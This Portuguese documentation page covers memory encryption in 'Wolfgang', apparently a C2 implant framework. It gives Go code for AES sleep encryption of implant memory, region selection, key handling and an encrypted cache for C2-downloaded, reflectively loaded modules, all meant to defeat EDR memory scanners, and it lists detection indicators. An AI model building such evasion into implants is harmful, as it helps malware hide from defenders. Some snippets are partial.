    Memory Encryption¶

    O que é¶

    Memory encryption no Wolfgang protege dados sensíveis em memória usando criptografia AES-256. Dois subsistemas usam essa capacidade:

    1. Sleep encryption: Criptografa seções PE e buffers registrados durante sleep (abordado em detalhe na página de Sleep Obfuscation)
    2. Module cache: Armazena módulos baixados do C2 server criptografados com AES-256-GCM, descriptografando apenas quando necessários

    O objetivo é minimizar a janela de tempo em que dados sensíveis existem em cleartext na memória do processo.

    Por que funciona¶

    Memory scanners (tanto de EDRs quanto ferramentas forenses) operam sobre bytes em cleartext na memória. As estratégias de detecção incluem:

    • Signature matching: Busca por byte patterns conhecidos (strings, opcodes)
    • YARA rules: Regras combinando múltiplos patterns e condições
    • Entropy analysis: Regiões de alta entropia podem indicar shellcode

    Criptografia AES transforma o conteúdo em bytes pseudo-aleatórios que não matcham nenhuma signature. A alta entropia do ciphertext é indistinguível de dados comprimidos legítimos.

    A separação entre AES-CTR (sleep) e AES-GCM (cache) é intencional:

    • CTR para sleep: Sem overhead de tag de autenticação, operação in-place sem alocação extra, ideal para regiões de memória grandes
    • GCM para cache: Autenticação garante integridade dos módulos armazenados, protege contra tampering

    Implementação no Wolfgang¶

    Sleep Encryption (AES-256-CTR)¶

    Criptografia in-place de regiões de memória durante sleep:

    func aesEncryptInPlace(data []byte, key []byte) ([]byte, error) {
    block, err := aes.NewCipher(key)
    if err != nil {
        return nil, err
    }
    nonce := make([]byte, aes.BlockSize) // 16 bytes para CTR
    rand.Read(nonce)
    stream := cipher.NewCTR(block, nonce)
    stream.XORKeyStream(data, data) // encrypt in-place
    return nonce, nil
}

func aesDecryptInPlace(data []byte, key []byte, nonce []byte) error {
    block, err := aes.NewCipher(key)
    if err != nil {
        return err
    }
    stream := cipher.NewCTR(block, nonce)
    stream.XORKeyStream(data, data) // decrypt in-place (CTR é simétrico)
    return nil
}

    CTR mode é ideal para sleep encryption porque:

    • XOR-based: mesma operação para encrypt e decrypt
    • In-place: não precisa de buffer temporário (memória já alocada)
    • Sem padding: preserva o tamanho exato da região
    • Nonce único por região: cada encryptedRegion armazena seu próprio nonce

    Seleção de regiões¶

    A função isEncryptableRegion determina quais regiões são candidatas:

    func isEncryptableRegion(protect uint32) bool {
    if protect&0x100 != 0 { return false } // PAGE_GUARD: skip
    if protect == 0x01 { return false }     // PAGE_NOACCESS: skip

    // Regiões com permissão de escrita são alvos
    writableMask := uint32(0x04 | 0x08 | 0x40 | 0x80)
    // PAGE_READWRITE | PAGE_WRITECOPY | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY
    return protect&writableMask != 0
}

    A lógica é conservadora: só criptografa regiões que o implant tem certeza de poder restaurar (regiões graváveis, sem guard pages).

    Key Management¶

    func (s *SleepObfuscator) platformSleep(duration time.Duration) error {
    // 1. Chave efêmera gerada a cada ciclo de sleep
    key := make([]byte, 32) // AES-256
    rand.Read(key)

    // ... encrypt, sleep, decrypt ...

    // 2. Zero da chave após uso
    for i := range key {
        key[i] = 0
    }
    return nil
}

    A chave é:

    • Efêmera: Nova chave gerada a cada ciclo de sleep via crypto/rand
    • Zerada após uso: Reduz a janela de exposição da chave em memória
    • Nunca persistida: Não é escrita em disco ou enviada ao C2

    Cada região recebe um nonce único, armazenado no struct encryptedRegion junto com as permissões originais para restore:

    type encryptedRegion struct {
    addr    uintptr
    size    uintptr
    nonce   []byte   // nonce único para esta região
    oldProt uint32   // proteção original para restore
}

    Module Cache (AES-256-GCM)¶

    O module cache armazena módulos baixados do C2 criptografados:

    type ModuleCache struct {
    mu      sync.RWMutex
    entries map[string]cacheEntry
    key     []byte // AES-256 key, gerada na criação do cache
}

func NewModuleCache() *ModuleCache {
    key := make([]byte, 32)
    rand.Read(key)
    return &ModuleCache{
        entries: make(map[string]cacheEntry),
        key:     key,
    }
}

    Put (armazenar módulo):

    func (c *ModuleCache) Put(name string, data []byte) {
    block, _ := aes.NewCipher(c.key)
    gcm, _ := cipher.NewGCM(block)
    nonce := make([]byte, gcm.NonceSize())
    rand.Read(nonce)
    encrypted := gcm.Seal(nil, nonce, data, nil)

    c.mu.Lock()
    c.entries[name] = cacheEntry{encrypted: encrypted, nonce: nonce}
    c.mu.Unlock()
}

    Get (recuperar módulo):

    func (c *ModuleCache) Get(name string) ([]byte, bool) {
    c.mu.RLock()
    entry, ok := c.entries[name]
    c.mu.RUnlock()
    if !ok { return nil, false }

    block, _ := aes.NewCipher(c.key)
    gcm, _ := cipher.NewGCM(block)
    plaintext, err := gcm.Open(nil, entry.nonce, entry.encrypted, nil)
    if err != nil { return nil, false }
    return plaintext, true
}

    Integração com Sleep Encryption¶

    O module cache rastreia regiões de memória onde módulos foram reflectively loaded, permitindo que o sleep obfuscator os inclua no ciclo de criptografia:

    func (c *ModuleCache) SetRegion(name string, addr, size uintptr) {
    // Registra a região de memória do módulo carregado
    e.addr = addr
    e.size = size
}

func (c *ModuleCache) Regions() []MemoryRegion {
    // Retorna todas as regiões de módulos carregados
    // Usado pelo sleep obfuscator para incluir no encrypt pass
    var regions []MemoryRegion
    for _, entry := range c.entries {
        if entry.addr != 0 && entry.size > 0 {
            regions = append(regions, MemoryRegion{Addr: entry.addr, Size: entry.size})
        }
    }
    return regions
}

    Detecção¶

    IOC Descrição
    Regiões de alta entropia em heap Dados criptografados no module cache
    VirtualProtect cycling em seções PE Transição RW -> NO_ACCESS -> RW
    CryptGenRandom / BCryptGenRandom calls Geração de chaves e nonces
    Módulos em memória sem backing em disco Reflectively loaded modules

    Limitações¶

    • A chave do module cache vive em memória pelo tempo de vida do processo
    • O momento de decrypt é uma janela de exposição (módulo em cleartext)
    • O zeroing da chave de sleep pode ser otimizado pelo compilador em alguns casos (Go mitiga isso melhor que C porque o GC não otimiza writes)
